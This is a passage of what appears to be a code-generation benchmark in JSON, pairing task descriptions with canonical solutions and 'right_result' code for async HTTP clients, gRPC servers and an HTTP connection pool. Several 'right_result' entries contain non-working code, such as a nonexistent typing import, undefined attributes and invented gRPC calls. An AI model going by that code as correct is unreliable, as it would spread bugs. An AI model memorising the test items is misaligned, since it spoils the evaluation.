    "Instruction": "Task Description: Implement asynchronous HTTP client functions to interact with a gacha information API, retrieving lists of available gacha and their detailed information.\n\nFunction Description: The code consists of two asynchronous functions that use httpx library to make HTTP requests to a gacha information API. The first function retrieves a list of available gacha, while the second fetches detailed information for a specific gacha using its ID.\n\nInput: \n- For `gacha_info_list()`: None\n- For `gacha_info(gacha_id)`: \n  - gacha_id: [str] - The unique identifier of the gacha to fetch details for\n\nOutput: \n- For `gacha_info_list()`: [list] - A list of available gacha items\n- For `gacha_info(gacha_id)`: [dict] - A dictionary containing detailed information about the specified gacha",
    "Canonical_solution": "import httpx\n\nBASE_URL = 'https://operation-webstatic.mihoyo.com/gacha_info/hk4e/cn_gf01/%s'\n\nasync def gacha_info_list():\n    async with httpx.AsyncClient() as client:\n        res = await client.get(url=BASE_URL % 'gacha/list.json')\n        json_data = res.json()\n        return json_data['data']['list']\n\nasync def gacha_info(gacha_id):\n    async with httpx.AsyncClient() as client:\n        res = await client.get(url=BASE_URL % gacha_id + '/zh-cn.json')\n        return res.json()",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\n\nasync def gacha_info_list():\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\"https://api.gacha.info/gachas\")\n        response.raise_for_status()\n        return response.json()\n\nasync def gacha_info(gacha_id):\n    async with httpx.AsyncClient() as client:\n        response = await client.get(f\"https://api.gacha.info/gachas/{gacha_id}\")\n        response.raise_for_status()\n        return response.json()"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles network compute bridge requests using thread pools for concurrency and inter-process communication queues for request/response handling.\n\nClass Description: NetworkComputeBridgeWorkerServicer is a gRPC servicer class that processes incoming network compute requests and model listing requests, using input/output queues for inter-process communication.\n\nAttributes:\n- thread_input_queue: [multiprocessing.Queue] - Queue for receiving incoming requests from gRPC clients\n- thread_output_queue: [multiprocessing.Queue] - Queue for sending responses back to gRPC clients\n\nMethods:\n- NetworkCompute: [Name](request, context) -> [network_compute_bridge_pb2.NetworkComputeResponse] - Processes a network compute request by putting it in the input queue and waiting for response from output queue\n- ListAvailableModels: [Name](request, context) -> [network_compute_bridge_pb2.ListAvailableModelsResponse] - Processes a model listing request by putting it in the input queue and waiting for response from output queue\n\nFunction Description: start_grpc_server creates and starts a gRPC server instance with thread pool executor, registers the servicer, and binds it to a specified port.\n\nInput:\n- port: [int] - The port number on which the gRPC server should listen\n\nOutput:\n- server: [grpc.Server] - The running gRPC server instance",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nimport multiprocessing\nfrom multiprocessing import Queue\nimport bosdyn.api.network_compute_bridge_service_pb2_grpc as network_compute_bridge_service_pb2_grpc\nimport bosdyn.api.network_compute_bridge_pb2 as network_compute_bridge_pb2\nimport bosdyn.api.header_pb2 as header_pb2\n\nREQUEST_QUEUE = Queue()\nRESPONSE_QUEUE = Queue()\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_service_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self, thread_input_queue, thread_output_queue):\n        super(NetworkComputeBridgeWorkerServicer, self).__init__()\n        self.thread_input_queue = thread_input_queue\n        self.thread_output_queue = thread_output_queue\n\n    def NetworkCompute(self, request, context):\n        self.thread_input_queue.put(request)\n        out_proto = self.thread_output_queue.get()\n        return out_proto\n\n    def ListAvailableModels(self, request, context):\n        self.thread_input_queue.put(request)\n        out_proto = self.thread_output_queue.get()\n        return out_proto\n\ndef start_grpc_server(port):\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    network_compute_bridge_service_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(\n        NetworkComputeBridgeWorkerServicer(REQUEST_QUEUE, RESPONSE_QUEUE), server)\n    server.add_insecure_port(f'[::]:{port}')\n    server.start()\n    return server",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nimport threading\nfrom concurrent import futures\nimport network_compute_bridge_pb2\nimport network_compute_bridge_pb2_grpc\nimport multiprocessing\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self):\n        self.thread_input_queue = multiprocessing.Queue()\n        self.thread_output_queue = multiprocessing.Queue()\n\n    def NetworkCompute(self, request, context):\n        self.thread_input_queue.put(request)\n        response = self.thread_output_queue.get()\n        return response\n\n    def ListAvailableModels(self, request, context):\n        self.thread_input_queue.put(request)\n        response = self.thread_output_queue.get()\n        return response\n\ndef start_grpc_server(port):\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    network_compute_bridge_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(NetworkComputeBridgeWorkerServicer(), server)\n    server.add_insecure_port(f'[::]:{port}')\n    server.start()\n    print(f\"gRPC server started on port {port}\")\n    try:\n        while True:\n            server.wait_for_termination(1)\n    except KeyboardInterrupt:\n        server.stop(0)\n    return server"
  },
  {
    "Task_id": 501,
    "Instruction": "Task Description: Implement a gRPC server class for Vizier service that handles concurrent requests and manages service lifecycle.\n\nClass Description: DefaultVizierServer is a class that sets up and manages a gRPC server for Vizier service, including initialization, startup, and configuration of related services. It handles concurrent requests using a thread pool and provides access to the server's datastore and endpoint.\n\nAttributes:\n- _host: [str] - The host address where the server will run (default: 'localhost')\n- _database_url: [Optional[str]] - URL for the database connection\n- _policy_factory: [Any] - Factory for creating policy objects (default: service_policy_factory_lib.DefaultPolicyFactory)\n- _early_stop_recycle_period: [datetime.timedelta] - Time period for early stop recycling (default: 0.1 seconds)\n- _port: [int] - The port number selected for the server\n- _servicer: [Any] - The Vizier service implementation\n- _server: [grpc.Server] - The gRPC server instance\n- stub: [Any] - The client stub for the server\n\nMethods:\n- __init__(host: str = 'localhost', database_url: Optional[str] = None, policy_factory=None, early_stop_recycle_period: datetime.timedelta = datetime.timedelta(seconds=0.1)) -> None - Initializes the server with configuration parameters\n- datastore() -> [property] - Returns the datastore from the servicer\n- endpoint() -> [property] - Returns the server endpoint as 'host:port'\n- start() -> None - Starts the gRPC server and initializes services\n- wait_for_early_stop_recycle_period() -> None - Waits for the configured early stop recycle period",
    "Canonical_solution": "from concurrent import futures\nimport datetime\nimport time\nfrom typing import Optional\nimport grpc\nimport portpicker\nfrom vizier._src.service import vizier_service\nfrom vizier._src.service import vizier_service_pb2_grpc\nfrom vizier._src.service import stubs_util\nfrom vizier._src.service import pythia_service\nfrom vizier._src.service import pythia_service_pb2_grpc\n\nclass DefaultVizierServer:\n    def __init__(self, host: str = 'localhost', database_url: Optional[str] = None, \n                 policy_factory=None, early_stop_recycle_period: datetime.timedelta = datetime.timedelta(seconds=0.1)):\n        self._host = host\n        self._database_url = database_url\n        self._policy_factory = policy_factory or service_policy_factory_lib.DefaultPolicyFactory\n        self._early_stop_recycle_period = early_stop_recycle_period\n        self._port = portpicker.pick_unused_port()\n        \n        # Initialize non-user-settable fields\n        self._servicer = None\n        self._server = None\n        self.stub = None\n\n    @property\n    def datastore(self):\n        return self._servicer.datastore\n\n    @property\n    def endpoint(self):\n        return f'{self._host}:{self._port}'\n\n    def start(self):\n        # Setup Vizier server\n        self._servicer = vizier_service.VizierServicer(\n            database_url=self._database_url,\n            early_stop_recycle_period=self._early_stop_recycle_period\n        )\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=30))\n        vizier_service_pb2_grpc.add_VizierServiceServicer_to_server(\n            self._servicer, self._server\n        )\n        self._server.add_insecure_port(self.endpoint)\n        self._server.start()\n        self.stub = stubs_util.create_vizier_server_stub(self.endpoint)\n\n        # Setup default Pythia Service\n        default_pythia_service = pythia_service.PythiaServicer(\n            self._servicer, policy_factory=self._policy_factory\n        )\n        self._servicer.default_pythia_service = default_pythia_service\n\n    def wait_for_early_stop_recycle_period(self):\n        time.sleep(self._early_stop_recycle_period.total_seconds())",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport threading\nfrom datetime import timedelta\nfrom typing import Any, Optional, Property, TypeVar\n\n_T = TypeVar('_T')\n\nclass DefaultVizierServer:\n    def __init__(self, host: str = 'localhost', database_url: Optional[str] = None, policy_factory=None, early_stop_recycle_period: timedelta = timedelta(seconds=0.1)) -> None:\n        self._host = host\n        self._database_url = database_url\n        self._policy_factory = policy_factory or service_policy_factory_lib.DefaultPolicyFactory\n        self._early_stop_recycle_period = early_stop_recycle_period\n        self._port = 50051\n        self._servicer = None\n        self._server = None\n        self._stub = None\n\n    @property\n    def datastore(self) -> _T:\n        return self._servicer.datastore\n\n    @property\n    def endpoint(self) -> str:\n        return f\"{self._host}:{self._port}\"\n\n    def start(self) -> None:\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        self._servicer = VizierService(self._database_url, self._policy_factory)\n        self._server.add_insecure_port(f\"{self._host}:{self._port}\")\n        self._server.start()\n        self._stub = VizierStub(self._server)\n\n    def wait_for_early_stop_recycle_period(self) -> None:\n        threading.Timer(self._early_stop_recycle_period.total_seconds(), self._server.stop).start()"
  },
  {
    "Task_id": 502,
    "Instruction": "Task Description: Create a gRPC server in Python that handles incoming requests using a thread pool for concurrency and implements a dummy API for testing purposes.\n\nClass Description: The DummyServer class implements a gRPC server that listens on a specified address and handles incoming requests through a servicer class. It manages server lifecycle and provides a simple echo service.\n\nAttributes:\n- server: [grpc.Server] - The gRPC server instance configured with thread pool executor and message size limits\n- bind_address: [str] - The network address and port where the server will listen for incoming connections\n\nMethods:\n- __init__: [Name](bind_address: str) -> None - Initializes the gRPC server with thread pool executor, configures message size limits, and binds to the specified address\n- __enter__: [Name]() -> DummyServer - Starts the server and returns the instance (for context manager usage)\n- __exit__: [Name](exc_type, exc_val, exc_tb) -> None - Stops the server when exiting context (for context manager usage)\n- GNESServicer.dummyAPI: [Name](request, context) -> request - Servicer method that echoes back received requests (implements dummy API)",
    "Canonical_solution": "import os\nimport grpc\nfrom concurrent.futures import ThreadPoolExecutor\nfrom tests.proto_s import dummy_pb2_grpc\n\nclass DummyServer:\n    def __init__(self, bind_address):\n        self.server = grpc.server(\n            ThreadPoolExecutor(max_workers=1),\n            options=[('grpc.max_send_message_length', 1 * 1024 * 1024),\n                     ('grpc.max_receive_message_length', 1 * 1024 * 1024)])\n        dummy_pb2_grpc.add_DummyGRPCServiceServicer_to_server(self.GNESServicer(), self.server)\n        self.bind_address = bind_address\n        self.server.add_insecure_port(self.bind_address)\n\n    def __enter__(self):\n        self.server.start()\n        print('dummy server is listening at: %s' % self.bind_address)\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.server.stop(None)\n\n    class GNESServicer(dummy_pb2_grpc.DummyGRPCServiceServicer):\n        def dummyAPI(self, request, context):\n            print('the dummy server received something: %s' % request)\n            return request",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "```python\nimport grpc\nfrom concurrent import futures\nimport threading\nimport time\n\nclass GNESServicer:\n    def dummyAPI(self, request, context):\n        return request\n\nclass DummyServer:\n    def __init__(self, bind_address: str):\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        self.bind_address = bind_address\n        self.add_service()\n        self.server.add_insecure_port(self.bind_address)\n        self.server.start()\n\n    def add_service(self):\n        gnes_service = GNESServicer()\n        grpc.add_GNESServicer_to_server(gnes_service, self.server)\n\n    def __enter__(self):\n        self.server.start()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.server.stop(5)\n\ndef run_server(bind_address: str):\n    server = DummyServer(bind_address)\n    try:\n        server.server.wait_for_termination()\n    except KeyboardInterrupt:\n        server.server.stop(5)\n```"
  },
  {
    "Task_id": 51,
    "Instruction": "Task Description: Create an asynchronous function to check the health status of a server by querying its live and ready endpoints.\n\nFunction Description: The function uses httpx.AsyncClient to asynchronously send HTTP GET requests to a server's health endpoints (/v1/health/live and /v1/health/ready). It returns a tuple indicating whether the server is live and ready based on the HTTP status codes received.\n\nInput: \n- url (str): The base URL of the server to check\n\nOutput: \n- Tuple[bool, bool]: A tuple where the first element indicates if the server is live (HTTP 200 status) and the second element indicates if the server is ready (HTTP 200 status)",
    "Canonical_solution": "from typing import Tuple\nimport httpx\n\nasync def _get_health(url: str) -> Tuple[bool, bool]:\n    \"\"\"\n    Query {url}/v1/health/{live,ready} to check if the server is running and ready\n\n    Args:\n        url (str): URL of the server\n\n    Returns:\n        Tuple[bool, bool]: (is_live, is_ready)\n    \"\"\"\n    async with httpx.AsyncClient() as client:\n        live = await client.get(f\"{url}/v1/health/live\")\n        ready = await client.get(f\"{url}/v1/health/ready\")\n        return live.status_code == 200, ready.status_code == 200",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\n\nasync def check_server_health(url: str) -> tuple[bool, bool]:\n    async with httpx.AsyncClient() as client:\n        live_response = await client.get(f\"{url}/v1/health/live\")\n        ready_response = await client.get(f\"{url}/v1/health/ready\")\n        return (live_response.status_code == 200, ready_response.status_code == 200)"
  },
  {
    "Task_id": 53,
    "Instruction": "Task Description: Create an asynchronous function to fetch data from a specified URL using HTTP GET request with customizable headers, handling potential HTTP errors.\n\nFunction Description: The function uses httpx library with asyncio to make asynchronous HTTP requests. It creates an async client, sends a GET request to the provided URL, checks for successful response status, and returns the response object. Default headers are provided but can be overridden.\n\nInput:\n- url: str - The target URL to fetch data from\n- headers: dict (optional) - Custom headers to include in the request (defaults to common browser User-Agent if not provided)\n\nOutput:\n- Returns: httpx.Response - The HTTP response object containing status code, headers, and content\n- Raises: httpx.HTTPStatusError - If the response status code indicates an error (4xx or 5xx)",
    "Canonical_solution": "import os\nimport httpx\nimport aiofiles\n\nasync def fetch_data(url: str, headers: dict = None):\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n    } if headers is None else headers.get('headers')\n    async with httpx.AsyncClient() as client:\n        response = await client.get(url, headers=headers)\n        response.raise_for_status()  # Ensure successful response\n        return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\n\nasync def fetch_data(url: str, headers: dict = None) -> httpx.Response:\n    async with httpx.AsyncClient() as client:\n        if headers is None:\n            headers = {\"User-Agent\": \"Mozilla/5.0\"}\n        response = await client.get(url, headers=headers)\n        response.raise_for_status()\n        return response"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement an asynchronous function to fetch and filter GitHub contributors for a repository, then retrieve their detailed user information.\n\nFunction Description: This function asynchronously retrieves contributors from a GitHub repository using the GitHub API, filters them based on specific criteria (user type, ignored logins, and acknowledgements), and then fetches detailed information for each qualifying contributor. The function uses httpx for asynchronous HTTP requests and handles pagination to retrieve all contributors.\n\nInput:\n- auth: Tuple[str, str] - A tuple containing GitHub username and password/token for authentication\n- GITHUB_API_CONTRIBUTORS: str - The GitHub API endpoint for contributors\n- PER_PAGE: int - Number of contributors to fetch per page\n- GITHUB_USER_TYPE: str - The type of contributor to filter for (e.g., 'User')\n- IGNORED_AUTHOR_LOGINS: List[str] - List of GitHub logins to ignore\n- ACKNOWLEDGEMENTS: str - String containing acknowledged contributors to exclude\n\nOutput:\n- List[Dict] - A list of dictionaries containing detailed user information for unacknowledged contributors who meet the filtering criteria",
    "Canonical_solution": "import asyncio\nimport httpx\n\nasync def main():\n    auth = (input(\"Github Username: \"), getpass())\n    async with httpx.AsyncClient() as client:\n        page = 0\n        results = []\n        contributors = []\n        while not page or len(results) == PER_PAGE:\n            page += 1\n            response = await client.get(\n                f\"{GITHUB_API_CONTRIBUTORS}?per_page={PER_PAGE}&page={page}\", auth=auth\n            )\n            results = response.json()\n            contributors.extend(\n                (\n                    contributor\n                    for contributor in results\n                    if contributor[\"type\"] == GITHUB_USER_TYPE\n                    and contributor[\"login\"] not in IGNORED_AUTHOR_LOGINS\n                    and f\"@{contributor['login'].lower()}\" not in ACKNOWLEDGEMENTS\n                )\n            )\n\n        unacknowledged_users = await asyncio.gather(\n            *(client.get(contributor[\"url\"], auth=auth) for contributor in contributors)\n        )\n        unacknowledged_users = [request.json() for request in unacknowledged_users]",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import List, Dict, Tuple, Optional\n\nasync def fetch_contributors(auth: Tuple[str, str], \n                             GITHUB_API_CONTRIBUTORS: str, \n                             PER_PAGE: int, \n                             GITHUB_USER_TYPE: str, \n                             IGNORED_AUTHOR_LOGINS: List[str], \n                             ACKNOWLEDGEMENTS: str) -> List[Dict]:\n    async with httpx.AsyncClient() as client:\n        page = 1\n        all_contributors = []\n        while True:\n            url = f\"{GITHUB_API_CONTRIBUTORS}?page={page}&per_page={PER_PAGE}\"\n            headers = {\n                \"Authorization\": f\"token {auth[1]}\",\n                \"Accept\": \"application/vnd.github.v3+json\"\n            }\n            response = await client.get(url, headers=headers)\n            if response.status_code != 200:\n                break\n            contributors = response.json()\n            if not contributors:\n                break\n            for contrib in contributors:\n                if contrib['type'] != GITHUB_USER_TYPE:\n                    continue\n                if contrib['login'] in IGNORED_AUTHOR_LOGINS:\n                    continue\n                if contrib['login'] in ACKNOWLEDGEMENTS:\n                    continue\n                # Fetch detailed user info\n                user_url = f\"https://api.github.com/users/{contrib['login']}\"\n                user_response = await client.get(user_url, headers=headers)\n                if user_response.status_code == 200:\n                    user_data = user_response.json()\n                    all_contributors.append(user_data)\n            page += 1\n        return all_contributors"
  },
  {
    "Task_id": 59,
    "Instruction": "Task Description: Create a Python class that interacts with a REST API, handling both synchronous and asynchronous task creation, with proper error handling and API availability checking.\n\nClass Description: The `Api` class provides an interface to interact with a REST API, allowing for synchronous and asynchronous task creation. It includes methods to verify API availability, create tasks, and handle API responses and errors.\n\nAttributes:\n- _api_url: str - The base URL of the API endpoint, defaults to \"http://127.0.0.1:8000\" if not provided\n- _create_response_files: bool - Flag indicating whether to create response files (unused in current implementation)\n\nMethods:\n- __init__(api_url: Optional[str] = None, create_response_files: bool = True) -> None - Initializes the API client with optional custom URL and response file setting\n- is_api_running() -> bool - Checks if the API is available by making a GET request to the base endpoint\n- create_async_task(data, scraper_name=None) -> dict - Creates an asynchronous task by sending a POST request with the provided data\n- create_sync_task(data, scraper_name=None) -> dict - Creates a synchronous task by sending a POST request with the provided data\n- _make_api_url(path) -> str - Helper method to construct full API URLs by combining base URL with endpoint path\n- _raise_for_status(response) -> None - Internal method to handle HTTP response status codes and raise appropriate exceptions",
    "Canonical_solution": "import requests\nfrom requests.exceptions import ConnectionError\nfrom typing import Optional\n\nclass ApiException(Exception):\n    pass\n\nclass Api:\n    def __init__(self, api_url: Optional[str] = None, create_response_files: bool = True) -> None:\n        DEFAULT_API_URL = \"http://127.0.0.1:8000\"\n        self._api_url = api_url if api_url else DEFAULT_API_URL\n        self._create_response_files = create_response_files\n        if not self.is_api_running():\n            raise ApiException(f\"API at {self._api_url} is not running. Please check if the API is up and running.\")\n\n    def _make_api_url(self, path):\n        return f\"{self._api_url}/{path}\"\n\n    def is_api_running(self) -> bool:\n        try:\n            response = requests.get(self._make_api_url(\"api\"))\n            return response.status_code == 200\n        except ConnectionError:\n            raise ApiException(f\"API at {self._api_url} is not running. Check the network connection or verify if the API is running on a different endpoint.\")\n\n    def create_async_task(self, data, scraper_name=None):\n        url = self._make_api_url(\"api/tasks/create-task-async\")\n        payload = {\n            \"data\": data,\n            \"scraper_name\": scraper_name,\n        }\n        response = requests.post(url, json=payload)\n        self._raise_for_status(response)\n        return response.json()\n\n    def create_sync_task(self, data, scraper_name=None):\n        url = self._make_api_url(\"api/tasks/create-task-sync\")\n        payload = {\n            \"data\": data,\n            \"scraper_name\": scraper_name,\n        }\n        response = requests.post(url, json=payload)\n        self._raise_for_status(response)\n        return response.json()\n\n    def _raise_for_status(self, response):\n        if 400 <= response.status_code < 500:\n            data = response.json()\n            message = data.get(\"message\")\n            if message:\n                raise ApiException(message)\n            else:\n                response.raise_for_status()    \n        elif 500 <= response.status_code < 600:\n            response.raise_for_status()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom typing import Optional, Dict, Any, List\nimport time\n\nclass Api:\n    def __init__(self, api_url: Optional[str] = None, create_response_files: bool = True) -> None:\n        self._api_url = api_url or \"http://127.0.0.1:8000\"\n        self._create_response_files = create_response_files\n\n    def is_api_running(self) -> bool:\n        try:\n            response = requests.get(f\"{self._api_url}/api/status\")\n            response.raise_for_status()\n            return True\n        except requests.RequestException as e:\n            print(f\"API not available: {e}\")\n            return False\n\n    def create_async_task(self, data: Dict[str, Any], scraper_name: Optional[str] = None) -> Dict[str, Any]:\n        url = self._make_api_url(\"/api/tasks/async\")\n        payload = {\"data\": data, \"scraper_name\": scraper_name}\n        try:\n            response = requests.post(url, json=payload)\n            self._raise_for_status(response)\n            return response.json()\n        except requests.RequestException as e:\n            print(f\"Failed to create async task: {e}\")\n            return {\"error\": str(e)}\n\n    def create_sync_task(self, data: Dict[str, Any], scraper_name: Optional[str] = None) -> Dict[str, Any]:\n        url = self._make_api_url(\"/api/tasks/sync\")\n        payload = {\"data\": data, \"scraper_name\": scraper_name}\n        try:\n            response = requests.post(url, json=payload)\n            self._raise_for_status(response)\n            return response.json()\n        except requests.RequestException as e:\n            print(f\"Failed to create sync task: {e}\")\n            return {\"error\": str(e)}\n\n    def _make_api_url(self, path: str) -> str:\n        return f\"{self._api_url}{path}\"\n\n    def _raise_for_status(self, response: requests.Response) -> None:\n        if response.status_code >= 400:\n            try:\n                error_data = response.json()\n                raise ValueError(error_data.get(\"detail\", \"Unknown error\"))\n            except ValueError:\n                raise ValueError(f\"HTTP error {response.status_code}: {response.text}\") from None"
  },
  {
    "Task_id": 6,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, supporting both HTTP and HTTPS protocols with configurable pooling behavior.\n\nClass Description: HTTPConnectionPool is a connection pooling implementation that manages a pool of HTTP/HTTPS connections to a specific host, allowing for connection reuse and efficient resource management. It handles connection creation, retrieval, and release with support for timeouts, retries, and proxy configurations.\n\nAttributes:\n- scheme: str - The URL scheme (either \"http\" or \"https\")\n- ConnectionCls: class - The connection class to use (HTTPConnection or HTTPSConnection)\n- QueueCls: class - The queue class to use for connection pooling (default: queue.LifoQueue)\n- host: str - The target host for connections\n- port: Optional[int] - The target port for connections\n- timeout: Union[Timeout, float, None] - Connection and read timeout settings\n- retries: Union[Retry, bool, int, None] - Retry configuration for failed requests\n- pool: queue.LifoQueue - The connection pool queue\n- block: bool - Whether to block when pool is full/empty\n- proxy: Optional[Url] - Proxy configuration\n- proxy_headers: Optional[Mapping[str, str]] - Headers for proxy connections\n- headers: Optional[Mapping[str, str]] - Default headers for requests\n- conn_kw: Any - Additional connection keyword arguments\n\nMethods:\n- __init__(host: str, port: Optional[int] = None, timeout: Union[Timeout, float, None] = None, maxsize: int = 1, block: bool = False, headers: Optional[Mapping[str, str]] = None, retries: Union[Retry, bool, int, None] = None, _proxy: Optional[Url] = None, _proxy_headers: Optional[Mapping[str, str]] = None, **conn_kw: Any) -> None - Initializes the connection pool with given configuration\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout: Optional[float] = None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn: Optional[HTTPConnection]) -> None - Returns a connection to the pool\n- _make_request(conn: HTTPConnection, method: str, url: str, body: Optional[Any] = None, headers: Optional[Mapping[str, str]] = None, retries: Optional[Retry] = None, timeout: Union[Timeout, float, None] = None, **response_kw: Any) -> BaseHTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method: str, url: str, body: Optional[Any] = None, headers: Optional[Mapping[str, str]] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Union[Timeout, float, None] = None, pool_timeout: Optional[int] = None, **response_kw: Any) -> BaseHTTPResponse - Main method to execute HTTP requests using pooled connections\n- _close_pool_connections(pool: queue.LifoQueue) -> None - Closes all connections in the pool\n- close() -> None - Closes the connection pool and all its connections",
    "Canonical_solution": "from socket import timeout as SocketTimeout\nfrom types import TracebackType\nfrom typing import Any, Mapping, Optional, Union\nimport queue\nimport weakref\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    FullPoolError,\n    HostChangedError,\n    LocationValueError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n)\nfrom .response import BaseHTTPResponse\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, parse_url\nfrom .util.util import to_str\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n    QueueCls = queue.LifoQueue\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        timeout: Union[Timeout, float, None] = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Union[Retry, bool, int, None] = None,\n        _proxy: Optional[Url] = None,\n        _proxy_headers: Optional[Mapping[str, str]] = None,\n        **conn_kw: Any,\n    ):\n        if not host:\n            raise LocationValueError(\"No host specified.\")\n\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = self.QueueCls(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.headers = headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n        weakref.finalize(self, self._close_pool_connections, self.pool)\n\n    def _new_conn(self) -> HTTPConnection:\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw,\n        )\n\n    def _get_conn(self, timeout: Optional[float] = None) -> HTTPConnection:\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool is empty and blocking is enabled.\")\n            conn = self._new_conn()\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = self._new_conn()\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn: Optional[HTTPConnection]) -> None:\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            if conn:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        body: Optional[Any] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Retry] = None,\n        timeout: Union[Timeout, float, None] = None,\n        **response_kw: Any,\n    ) -> BaseHTTPResponse:\n        timeout_obj = self.timeout if timeout is None else Timeout.from_float(timeout)\n        \n        try:\n            conn.request(\n                method,\n                url,\n                body=body,\n                headers=headers,\n            )\n            response = conn.getresponse()\n            response._pool = self\n            return response\n        except (SocketTimeout, BaseSSLError, OSError) as e:\n            conn.close()\n            raise\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: Optional[Any] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Retry] = None,\n        redirect: bool = True,\n        assert_same_host: bool = True,\n        timeout: Union[Timeout, float, None] = None,\n        pool_timeout: Optional[int] = None,\n        **response_kw: Any,\n    ) -> BaseHTTPResponse:\n        conn = None\n        try:\n            conn = self._get_conn(timeout=pool_timeout)\n            response = self._make_request(\n                conn,\n                method,\n                url,\n                body=body,\n                headers=headers,\n                retries=retries,\n                timeout=timeout,\n                **response_kw,\n            )\n            return response\n        except (EmptyPoolError, MaxRetryError, HostChangedError) as e:\n            raise\n        except (TimeoutError, HTTPException, OSError) as e:\n            if conn:\n                conn.close()\n            raise\n        finally:\n            if conn:\n                self._put_conn(conn)\n\n    def _close_pool_connections(self, pool: queue.LifoQueue) -> None:\n        try:\n            while True:\n                conn = pool.get(block=False)\n                if conn:\n                    conn.close()\n        except queue.Empty:\n            pass\n\n    def close(self) -> None:\n        if self.pool:\n            self._close_pool_connections(self.pool)\n            self.pool = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import socket\nimport queue\nfrom urllib.parse import urlparse\nfrom typing import Any, Optional, Union, Mapping, Type, Dict, Tuple, List\nimport ssl\nimport http.client\nimport urllib.request\nimport time\nfrom urllib3.util.retry import Retry\nfrom urllib3.util.timeout import Timeout\n\nclass HTTPConnectionPool:\n    def __init__(self, host: str, port: Optional[int] = None, timeout: Union[Timeout, float, None] = None, maxsize: int = 1, block: bool = False, headers: Optional[Mapping[str, str]] = None, retries: Union[Retry, bool, int, None] = None, _proxy: Optional[str] = None, _proxy_headers: Optional[Mapping[str, str]] = None, **conn_kw: Any) -> None:\n        self.scheme = 'http'\n        self.ConnectionCls = http.client.HTTPConnection\n        self.QueueCls = queue.LifoQueue\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = self.QueueCls(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.headers = headers\n        self.conn_kw = conn_kw\n        self._setup_connections()\n\n    def _setup_connections(self):\n        for _ in range(self.maxsize):\n            self._new_conn()\n\n    def _new_conn(self) -> http.client.HTTPConnection:\n        if self.scheme == 'http':\n            return self.ConnectionCls(self.host, self.port, **self.conn_kw)\n        else:\n            context = ssl.create_default_context()\n            return self.ConnectionCls(self.host, self.port, ssl_context=context, **self.conn_kw)\n\n    def 